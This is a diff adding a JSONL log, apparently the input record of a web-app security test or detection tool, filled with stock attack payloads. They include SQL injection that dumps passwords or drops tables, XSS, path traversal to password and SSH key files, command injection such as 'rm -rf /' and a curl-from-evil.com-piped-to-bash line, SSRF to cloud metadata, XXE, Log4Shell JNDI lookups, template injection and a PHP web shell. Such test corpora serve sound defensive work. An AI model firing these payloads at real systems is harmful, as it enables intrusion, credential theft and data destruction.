@@ -1,0 +1,183 @@
+{"ts": "2025-11-28T12:43:10.556374", "text": "SELECT * FROM users WHERE '1'='1'", "meta": {"source": "test"}}
+{"ts": "2025-11-28T12:47:01.187347", "text": "SELECT * FROM auth_user WHERE '1'='1'", "meta": {"source": "test"}}
+{"ts": "2025-11-28T13:17:50.009434", "text": "SELECT * FROM auth_user WHERE '1'='1'", "meta": {"source": "test"}}
+{"ts": "2025-11-28T14:17:09.596307", "text": "' OR '1'='1", "meta": {}}
+{"ts": "2025-11-28T14:17:09.638924", "text": "' OR 'x'='x", "meta": {}}
+{"ts": "2025-11-28T14:17:09.672893", "text": "1' OR '1'='1", "meta": {}}
+{"ts": "2025-11-28T14:17:09.698226", "text": "admin' OR 1=1--", "meta": {}}
+{"ts": "2025-11-28T14:17:09.739546", "text": "' OR 'a'='a", "meta": {}}
+{"ts": "2025-11-28T14:17:09.782304", "text": "' OR ''='", "meta": {}}
+{"ts": "2025-11-28T14:17:09.823509", "text": "\" OR \"\" = \"\"", "meta": {}}
+{"ts": "2025-11-28T14:17:09.855271", "text": "' OR 1=1#", "meta": {}}
+{"ts": "2025-11-28T14:17:09.891489", "text": "' OR 1=1 -- ", "meta": {}}
+{"ts": "2025-11-28T14:17:09.920938", "text": "' OR 1=1/*", "meta": {}}
+{"ts": "2025-11-28T14:17:09.944579", "text": "1 OR 1=1", "meta": {}}
+{"ts": "2025-11-28T14:17:09.973025", "text": "' OR SLEEP(5)--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.001250", "text": "1' AND SLEEP(2) AND '1'='1", "meta": {}}
+{"ts": "2025-11-28T14:17:10.041732", "text": "' UNION SELECT NULL,NULL--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.092829", "text": "' UNION SELECT username,password FROM users--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.148534", "text": "' UNION SELECT table_name,null FROM information_schema.tables--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.198324", "text": "' UNION SELECT load_file('/etc/passwd'),null--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.245909", "text": "' UNION SELECT CHAR(65,66,67),NULL--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.293587", "text": "' AND 1=(SELECT COUNT(*) FROM users)--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.332991", "text": "' HAVING 1=1--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.368994", "text": "' GROUP BY username HAVING 1=1--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.412463", "text": "') OR 1=1/*", "meta": {}}
+{"ts": "2025-11-28T14:17:10.459089", "text": "') OR ('a'='a", "meta": {}}
+{"ts": "2025-11-28T14:17:10.514400", "text": "' OR '1'='1' {", "meta": {}}
+{"ts": "2025-11-28T14:17:10.573304", "text": "admin'--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.615664", "text": "admin' #", "meta": {}}
+{"ts": "2025-11-28T14:17:10.646563", "text": "admin'/*", "meta": {}}
+{"ts": "2025-11-28T14:17:10.683453", "text": "1'; DROP TABLE users; --", "meta": {}}
+{"ts": "2025-11-28T14:17:10.784702", "text": "' DROP TABLE users --", "meta": {}}
+{"ts": "2025-11-28T14:17:10.828716", "text": "'; EXEC xp_cmdshell('dir')--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.878139", "text": "' OR EXISTS(SELECT * FROM users)--", "meta": {}}
+{"ts": "2025-11-28T14:17:10.950041", "text": "' OR ASCII(SUBSTRING((SELECT @@version),1,1))>52--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.012547", "text": "%27%20OR%201%3D1--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.058473", "text": "%27%20OR%20%27a%27%3D%27a", "meta": {}}
+{"ts": "2025-11-28T14:17:11.101723", "text": "%2527%2520OR%25201%253D1--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.136856", "text": "%c0%27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.169129", "text": "%bf%27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.220115", "text": "1' AND (SELECT 1 FROM pg_sleep(5))--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.289603", "text": "1 AND BENCHMARK(10000000,MD5(1))--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.352748", "text": "' OR IF(1=1,SLEEP(3),0)--", "meta": {}}
+{"ts": "2025-11-28T14:17:11.437560", "text": "<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.491979", "text": "<img src=x onerror=alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.525276", "text": "<svg onload=alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.551117", "text": "<iframe src=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.582128", "text": "<body onload=alert('XSS')>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.609865", "text": "javascript:alert(1)", "meta": {}}
+{"ts": "2025-11-28T14:17:11.648833", "text": "'><script>alert(document.cookie)</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.683341", "text": "\"/><script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.729840", "text": "<embed src=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.772053", "text": "<object data=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.806689", "text": "<details open ontoggle=alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.846734", "text": "<link rel=stylesheet href=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.901812", "text": "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">", "meta": {}}
+{"ts": "2025-11-28T14:17:11.942479", "text": "<scr<script>ipt>alert(1)</scr<script>ipt>", "meta": {}}
+{"ts": "2025-11-28T14:17:11.978513", "text": "<img src=x onerror=prompt(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.013692", "text": "<img src=x onerror=confirm(1)>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.106612", "text": "<svg><script>alert(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.141571", "text": "<video><source onerror=\"alert(1)\"></video>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.177170", "text": "<a href=javascript:alert(1)>click</a>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.201853", "text": "javascript:/*--><script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.227730", "text": "`;alert(1);//", "meta": {}}
+{"ts": "2025-11-28T14:17:12.249754", "text": "</script><script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.280124", "text": "<script src=//evil.com/xss.js></script>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.322042", "text": "<script>eval(atob('YWxlcnQoMSk='))</script>", "meta": {}}
+{"ts": "2025-11-28T14:17:12.351001", "text": "%3Cscript%3Ealert(1)%3C/script%3E", "meta": {}}
+{"ts": "2025-11-28T14:17:12.388919", "text": "&#60;script&#62;alert(1)&#60;/script&#62;", "meta": {}}
+{"ts": "2025-11-28T14:17:12.434385", "text": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "meta": {}}
+{"ts": "2025-11-28T14:17:12.466227", "text": "../../../../etc/passwd", "meta": {}}
+{"ts": "2025-11-28T14:17:12.493459", "text": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "meta": {}}
+{"ts": "2025-11-28T14:17:12.523972", "text": "/var/www/html/../../../../etc/passwd", "meta": {}}
+{"ts": "2025-11-28T14:17:12.550825", "text": "..%2f..%2f..%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-28T14:17:12.578040", "text": "..%c0%af..%c0%afetc/passwd", "meta": {}}
+{"ts": "2025-11-28T14:17:12.603222", "text": "..%5c..%5c..%5cwindows\\system.ini", "meta": {}}
+{"ts": "2025-11-28T14:17:12.634460", "text": "/../../../../../../boot.ini", "meta": {}}
+{"ts": "2025-11-28T14:17:12.670080", "text": "/../../../../../../root/.ssh/id_rsa", "meta": {}}
+{"ts": "2025-11-28T14:17:12.725225", "text": "....//....//....//etc/shadow", "meta": {}}
+{"ts": "2025-11-28T14:17:12.758122", "text": "..\\..\\..\\config\\database.yml", "meta": {}}
+{"ts": "2025-11-28T14:17:12.780921", "text": "; ls -la", "meta": {}}
+{"ts": "2025-11-28T14:17:12.801957", "text": "| cat /etc/passwd", "meta": {}}
+{"ts": "2025-11-28T14:17:12.826781", "text": "&& whoami", "meta": {}}
+{"ts": "2025-11-28T14:17:12.844498", "text": "|| id", "meta": {}}
+{"ts": "2025-11-28T14:17:12.866885", "text": "`id`", "meta": {}}
+{"ts": "2025-11-28T14:17:12.889230", "text": "$(whoami)", "meta": {}}
+{"ts": "2025-11-28T14:17:12.920848", "text": "`uname -a`", "meta": {}}
+{"ts": "2025-11-28T14:17:12.989426", "text": "`shutdown -h now`", "meta": {}}
+{"ts": "2025-11-28T14:17:13.035280", "text": "; rm -rf / #", "meta": {}}
+{"ts": "2025-11-28T14:17:13.086475", "text": "; ping -c 4 8.8.8.8", "meta": {}}
+{"ts": "2025-11-28T14:17:13.126091", "text": "; curl http://evil.com/a.sh | bash", "meta": {}}
+{"ts": "2025-11-28T14:17:13.169185", "text": "& net user", "meta": {}}
+{"ts": "2025-11-28T14:17:13.222194", "text": "| powershell -c whoami", "meta": {}}
+{"ts": "2025-11-28T14:17:13.249917", "text": "sleep 5 #", "meta": {}}
+{"ts": "2025-11-28T14:17:13.275731", "text": "'; ls; '", "meta": {}}
+{"ts": "2025-11-28T14:17:13.293120", "text": "a & echo hacked", "meta": {}}
+{"ts": "2025-11-28T14:17:13.319430", "text": "$(( $(echo 1) ))", "meta": {}}
+{"ts": "2025-11-28T14:17:13.343759", "text": "%3B%20ls%20-la", "meta": {}}
+{"ts": "2025-11-28T14:17:13.370663", "text": "%26%26%20whoami", "meta": {}}
+{"ts": "2025-11-28T14:17:13.404129", "text": "http://127.0.0.1/admin", "meta": {}}
+{"ts": "2025-11-28T14:17:13.443444", "text": "http://localhost:8080", "meta": {}}
+{"ts": "2025-11-28T14:17:13.484666", "text": "http://0.0.0.0:80", "meta": {}}
+{"ts": "2025-11-28T14:17:13.516154", "text": "http://[::1]/", "meta": {}}
+{"ts": "2025-11-28T14:17:13.545870", "text": "http://10.0.0.1/", "meta": {}}
+{"ts": "2025-11-28T14:17:13.579331", "text": "http://192.168.1.1/admin", "meta": {}}
+{"ts": "2025-11-28T14:17:13.610105", "text": "http://169.254.169.254/latest/meta-data/", "meta": {}}
+{"ts": "2025-11-28T14:17:13.650106", "text": "http://127.0.0.1:2375/v1.24/containers/json", "meta": {}}
+{"ts": "2025-11-28T14:17:13.680978", "text": "file:///etc/passwd", "meta": {}}
+{"ts": "2025-11-28T14:17:13.708243", "text": "dict://127.0.0.1:25/", "meta": {}}
+{"ts": "2025-11-28T14:17:13.737794", "text": "smb://127.0.0.1/", "meta": {}}
+{"ts": "2025-11-28T14:17:13.772618", "text": "gopher://127.0.0.1:11211/_stats", "meta": {}}
+{"ts": "2025-11-28T14:17:13.798990", "text": "http://127.0.0.1:8000/internal", "meta": {}}
+{"ts": "2025-11-28T14:17:13.834403", "text": "http://unix:/var/run/docker.sock:/info", "meta": {}}
+{"ts": "2025-11-28T14:17:13.865726", "text": "*)(|(objectclass=*))", "meta": {}}
+{"ts": "2025-11-28T14:17:13.897483", "text": "*))(uid=*))(|(uid=*", "meta": {}}
+{"ts": "2025-11-28T14:17:13.922281", "text": "(cn=*)", "meta": {}}
+{"ts": "2025-11-28T14:17:13.952952", "text": "*)(uid=*))(|(sn=*)", "meta": {}}
+{"ts": "2025-11-28T14:17:13.983830", "text": "admin*)(|(password=*))", "meta": {}}
+{"ts": "2025-11-28T14:17:14.011357", "text": "*)(!(|(cn=*)))", "meta": {}}
+{"ts": "2025-11-28T14:17:14.042990", "text": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "meta": {}}
+{"ts": "2025-11-28T14:17:14.081064", "text": "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>", "meta": {}}
+{"ts": "2025-11-28T14:17:14.136330", "text": "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><r>&xxe;</r>", "meta": {}}
+{"ts": "2025-11-28T14:17:14.175473", "text": "<!DOCTYPE foo [ <!ENTITY % x SYSTEM 'http://evil.com/evil.dtd'> %x; ]>", "meta": {}}
+{"ts": "2025-11-28T14:17:14.211327", "text": "<!ENTITY % xx SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">", "meta": {}}
+{"ts": "2025-11-28T14:17:14.237099", "text": "../../../../boot.ini", "meta": {}}
+{"ts": "2025-11-28T14:17:14.262214", "text": "{${jndi:ldap://attacker.com/a}}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.286031", "text": "${jndi:rmia://evil.com/bad}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.307520", "text": "{{ config.items() }}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.327830", "text": "${7*7}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.348402", "text": "{{7*7}}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.374697", "text": "${@print(md5(1))}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.396197", "text": "{{ dump(app) }}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.424780", "text": "{{ request.application.__dict__ }}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.455347", "text": "{% print 'hacked' %}", "meta": {}}
+{"ts": "2025-11-28T14:17:14.488619", "text": "AA' OR '1'='1'--", "meta": {}}
+{"ts": "2025-11-28T14:17:14.519901", "text": "A\" OR \"1\"=\"1\"--", "meta": {}}
+{"ts": "2025-11-28T14:17:14.547897", "text": "<%= system('ls') %>", "meta": {}}
+{"ts": "2025-11-28T14:17:14.580719", "text": "<% =File.open('/etc/passwd').read %>", "meta": {}}
+{"ts": "2025-11-28T14:17:14.608465", "text": "<?php system($_GET['cmd']); ?>", "meta": {}}
+
+{"ts": "2025-11-28T17:26:53.881780", "text": "username=' OR '1'='1' --", "meta": {}}
+{"ts": "2025-11-28T17:26:53.936866", "text": "' OR '1'='1' --", "meta": {}}
+{"ts": "2025-11-28T17:27:00.363635", "text": "username=' OR 'x'='x", "meta": {}}
+{"ts": "2025-11-28T17:27:00.434307", "text": "' OR 'x'='x", "meta": {}}
+{"ts": "2025-11-28T17:27:16.741148", "text": "search=[\" <script>alert('XSS')</script>\"]", "meta": {}}
+{"ts": "2025-11-28T17:27:16.813508", "text": "[\" <script>alert('XSS')</script>\"]", "meta": {}}
+{"ts": "2025-11-28T17:30:06.735238", "text": "search=[\"<scrıpt>alert('x')</scrıpt>\"]", "meta": {}}
+{"ts": "2025-11-28T17:30:06.797735", "text": "[\"<scrıpt>alert('x')</scrıpt>\"]", "meta": {}}
+{"ts": "2025-11-28T17:30:25.696964", "text": "search=['<scr&#x69;pt>alert(1)</scr&#x69;pt>']", "meta": {}}
+{"ts": "2025-11-28T17:30:25.767799", "text": "['<scr&#x69;pt>alert(1)</scr&#x69;pt>']", "meta": {}}
+{"ts": "2025-11-28T17:30:46.338863", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:30:46.398982", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:31:02.200901", "text": "search=['<a href=\"#\" oncl&#x69;ck=\"alert(1)\">click</a>']", "meta": {}}
+{"ts": "2025-11-28T17:31:02.261912", "text": "['<a href=\"#\" oncl&#x69;ck=\"alert(1)\">click</a>']", "meta": {}}
+{"ts": "2025-11-28T17:31:24.367822", "text": "search=['<svg><script>alert`x`</script></svg>']", "meta": {}}
+{"ts": "2025-11-28T17:31:24.419730", "text": "['<svg><script>alert`x`</script></svg>']", "meta": {}}
+{"ts": "2025-11-28T17:31:49.371759", "text": "search=['/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E']", "meta": {}}
+{"ts": "2025-11-28T17:31:49.464151", "text": "['/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E']", "meta": {}}
+{"ts": "2025-11-28T17:32:47.277056", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:32:47.347178", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:33:32.125245", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:33:32.259411", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:33:32.565696", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:33:32.656145", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-28T17:34:52.901638", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:34:53.032366", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:35:26.465277", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:35:26.538943", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
+{"ts": "2025-11-28T17:35:47.490867", "text": "username=%27%20OR%201=1--", "meta": {}}
+{"ts": "2025-11-28T17:35:47.537519", "text": "%27%20OR%201=1--", "meta": {}}
+{"ts": "2025-11-28T17:36:04.872683", "text": "username=0x27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-28T17:36:04.915423", "text": "0x27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-28T17:36:22.019579", "text": "username='; EXEC xp_cmdshell('dir'); --", "meta": {}}
+{"ts": "2025-11-28T17:36:22.065088", "text": "'; EXEC xp_cmdshell('dir'); --", "meta": {}}
+{"ts": "2025-11-28T17:37:00.988369", "text": "username=MSDwnZKq8J2RhSAx77ydMQ==", "meta": {}}
+{"ts": "2025-11-28T17:37:01.060510", "text": "MSDwnZKq8J2RhSAx77ydMQ==", "meta": {}}
+{"ts": "2025-11-28T17:38:26.524856", "text": "OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
+{"ts": "2025-11-28T17:38:26.626482", "text": "username=3120f09d92aaf09d91852031efbc9d31", "meta": {}}
+{"ts": "2025-11-28T17:38:26.719321", "text": "3120f09d92aaf09d91852031efbc9d31", "meta": {}}
+{"ts": "2025-11-28T17:56:58.422097", "text": "csrfmiddlewaretoken=OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
+{"ts": "2025-11-28T17:56:58.543382", "text": "OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
+{"ts": "2025-11-28T17:56:58.714968", "text": "username=amF2YXNjcmlwdDpldmFsKGF0b2IoJ1lXeGxjblFvTVNrPScpKQo=", "meta": {}}
+{"ts": "2025-11-28T17:56:58.852744", "text": "amF2YXNjcmlwdDpldmFsKGF0b2IoJ1lXeGxjblFvTVNrPScpKQo=", "meta": {}}
